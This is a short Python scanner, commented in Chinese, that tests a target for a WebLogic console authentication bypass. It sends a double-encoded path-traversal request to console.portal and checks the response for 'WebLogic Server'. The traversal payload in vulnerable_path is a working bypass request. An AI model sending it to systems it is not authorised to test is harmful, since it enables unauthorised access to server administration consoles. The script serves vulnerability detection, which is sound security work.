import requests

def scan(target_url):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36'
        }
        # 漏洞利用的URL路径
        vulnerable_path = "/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=AppDeploymentsControlPage&handle=com.bea.console.handles.JMXHandle%28%22com.bea%3AName%3Dbase_domain%2CType%3DDomain%22%29"
        # 完整的URL
        vul_url = target_url + vulnerable_path
        response = requests.get(vul_url, headers=headers, timeout=10)
        # 检查响应状态码是否为200 OK
        if response.status_code == 200:
            # 检查响应内容中是否包含特定的页面标识
             if "WebLogic Server" in response.text:
                return True
        return False
    except Exception as e:
        print(f"[-] 发生错误: {e}")
        return False